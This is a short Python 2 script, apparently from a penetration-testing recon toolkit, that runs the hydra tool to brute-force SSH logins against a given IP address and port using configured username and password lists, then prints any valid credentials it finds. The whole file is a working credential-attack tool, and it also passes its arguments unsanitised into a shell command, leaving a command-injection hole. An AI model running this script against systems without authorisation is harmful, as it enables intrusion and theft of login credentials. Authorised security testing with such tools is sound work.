#!/usr/bin/env python
import subprocess
import sys
import reconf
from reconf import *

if len(sys.argv) != 3:
    print "Usage: brute_ssh.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

print "INFO: Performing hydra ssh scan against " + ip_address
HYDRA = "hydra -L %s -P %s -f -t 4 -o %s/%s_sshhydra.txt -u %s -s %s ssh" % (reconf.usrlst, reconf.pwdlst, reconf.rsltpth, ip_address, ip_address, port)
try:
    results = subprocess.check_output(HYDRA, shell=True)
    resultarr = results.split("\n")
    for result in resultarr:
        if "login:" in result:
            print "[*] Valid ssh credentials found: " + result
except:
    print "INFO: No valid ssh credentials found"
